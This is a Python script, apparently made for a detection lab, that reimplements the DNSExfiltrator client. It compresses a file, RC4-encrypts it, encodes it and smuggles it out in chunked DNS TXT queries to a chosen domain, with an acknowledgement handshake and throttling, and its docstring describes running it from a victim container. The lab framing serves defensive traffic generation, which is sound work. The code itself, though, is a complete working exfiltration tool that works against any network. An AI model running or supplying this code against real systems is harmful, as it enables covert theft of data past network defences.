#!/usr/bin/env python3
"""DNSExfiltrator sender for the lab, on the wire identical to the Windows client.

Why this exists: the shipped client is a .NET Framework 4.0 assembly whose resolver
P/Invokes `dnsapi!DnsQuery_W` and refuses to run off Windows
(`if (Environment.OSVersion.Platform != PlatformID.Win32NT) throw new
NotSupportedException();`, dnsExfiltrator.cs:581), so `pwsh` on Linux loads the
assembly and then fails at the first TXT query. The card's fallback (Windows VM on
the internal network) is not available here, and the lab only needs the *traffic*:
this client produces the same queries the real one does, which is what
`scripts/cic_to_queries.py` labels as dnsexfiltrator -
    init.<base32("<file>|<nchunks>")>.base64.<domain>       (expects TXT "OK")
    <i>.<label>.<label>...<domain>                          (expects TXT "<i>")
with the payload being base64url(RC4(password, zip(file))) cut into <=63-char labels.
Encoding, chunking, the ACK handshake and the throttle are taken from the C# client;
only the DNS resolver call is Python (so it can run on Linux).

    python3 client.py /tmp/secret.bin exfil.tunnel.test mypassword --rate 5

Run it from the victim container so the source address is the victim's:
    docker compose -f testbed/docker-compose.yml exec victim \\
      python3 /tools/client.py ...
"""
from __future__ import annotations

import argparse
import base64
import random
import socket
import sys
import time
import zipfile
from io import BytesIO
from pathlib import Path

from dnslib import QTYPE, DNSHeader, DNSQuestion, DNSRecord

MAX_LABEL = 63  # DNS label limit, and the client's default `l=` value


def log(msg: str) -> None:
    print(f"{time.strftime('%H:%M:%S')} {msg}", flush=True)


def rc4(key: bytes, data: bytes) -> bytes:
    state = list(range(256))
    j = 0
    for i in range(256):
        j = (key[i % len(key)] + state[i] + j) & 0xFF
        state[i], state[j] = state[j], state[i]
    out = bytearray()
    x = y = 0
    for ch in data:
        x = (x + 1) & 0xFF
        y = (state[x] + y) & 0xFF
        state[x], state[y] = state[y], state[x]
        out.append(ch ^ state[(state[x] + state[y]) & 0xFF])
    return bytes(out)


def to_base64url(data: bytes) -> str:
    return base64.b64encode(data).decode().rstrip("=").replace("/", "_").replace("+", "-")


def to_base32(data: bytes) -> str:
    return base64.b32encode(data).decode().rstrip("=")


def build_requests(path: Path, domain: str, password: str, base32: bool, label_max: int, req_max: int):
    """ZIP -> RC4 -> base64url/base32 -> <chunk>.<labels> names, as the C# client does.

    `req_max` is the client's `r=` budget. A name that exceeds 253 chars is not a valid
    DNS query at all, so the number of full labels is clamped to what `req_max`, the
    domain suffix and the 253 limit all allow - the C# client gets away with a naive
    budget because Windows rejects the oversized query later instead of here.
    """
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(path.name, path.read_bytes())
    blob = rc4(password.encode(), buf.getvalue())
    data = to_base32(blob) if base32 else to_base64url(blob)

    # 10 bytes are reserved for the chunk number, exactly like the C# client.
    budget = min(req_max, 253)
    left = budget - 10 - len(domain) - 1
    full = max(0, left // (label_max + 1))
    chunk_max = full * label_max
    if chunk_max <= 0:
        raise SystemExit(f"domain {domain!r} leaves no room for labels at r={budget}; use a shorter domain or -b32")
    n_chunks = len(data) // chunk_max + 1

    init = "init." + to_base32(f"{path.name}|{n_chunks}".encode()) + (".base32." if base32 else ".base64.")
    yield init + domain
    for i in range(n_chunks):
        chunk = data[i * chunk_max : (i + 1) * chunk_max]
        labels = [chunk[j : j + label_max] for j in range(0, len(chunk), label_max)]
        yield ".".join([str(i)] + labels) + "." + domain


def txt_query(name: str, server: str, port: int = 53, timeout: float = 5.0) -> str:
    """One TXT lookup; returns the first TXT answer's text (the ACK), '' on timeout."""
    tid = random.randint(0, 0xFFFF)
    query = DNSRecord(DNSHeader(id=tid, qr=0, aa=0, ra=1), q=DNSQuestion(name, QTYPE.TXT))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(query.pack(), (server, port))
        data, _ = sock.recvfrom(4096)
    finally:
        sock.close()

    if len(data) < 12:
        return ""
    try:
        reply = DNSRecord.parse(data)
    except Exception:
        return ""
    answer = reply.a  # this dnslib keeps one RR in .a, not a list
    if answer is not None and answer.rtype == QTYPE.TXT:
        return str(answer.rdata).strip('"')
    return ""


def main() -> int:
    ap = argparse.ArgumentParser(description="DNSExfiltrator sender (lab, Linux)")
    ap.add_argument("file", type=Path)
    ap.add_argument("domain")
    ap.add_argument("password")
    ap.add_argument("--resolver", default="172.28.0.2", help="resolver to ask (the capture point)")
    ap.add_argument("--port", type=int, default=53)
    ap.add_argument("--rate", type=float, default=5.0, help="queries per second (0 = no throttle)")
    ap.add_argument("--base32", action="store_true", help="base32 payload instead of base64url")
    ap.add_argument("--label-max", type=int, default=MAX_LABEL)
    ap.add_argument("--req-max", type=int, default=255, help="max query length, as the client's r=")
    ap.add_argument("--dry-run", action="store_true", help="print the names, send nothing")
    args = ap.parse_args()

    names = list(
        build_requests(args.file, args.domain, args.password, args.base32, args.label_max, args.req_max)
    )
    longest = max(len(n) for n in names)
    if longest > 253:
        log(f"--req-max {args.req_max} produced a {longest}-char name; lower it (253 is the DNS limit)")
        return 2

    if args.dry_run:
        for name in names[:3]:
            print(name)
        print(f"... {len(names)} queries total, longest {longest} chars")
        return 0

    ack = txt_query(names[0], args.resolver, args.port)
    if ack != "OK":
        log(f"init got {ack!r} from {args.resolver}; the receiver may not be authoritative for {args.domain}")
        return 1
    log(f"init ok; sending {len(names) - 1} chunks to {args.domain} via {args.resolver}")

    delay = 1.0 / args.rate if args.rate > 0 else 0.0
    sent = 0
    for i, name in enumerate(names[1:], start=1):
        got = txt_query(name, args.resolver, args.port)
        if got != str(i - 1):
            log(f"chunk {i - 1} acked {got!r}; resending once")
            if delay:
                time.sleep(delay)
            got = txt_query(name, args.resolver, args.port)
        sent += 1
        if delay:
            time.sleep(delay)
    log(f"done: {sent + 1} queries")
    return 0


if __name__ == "__main__":
    sys.exit(main())
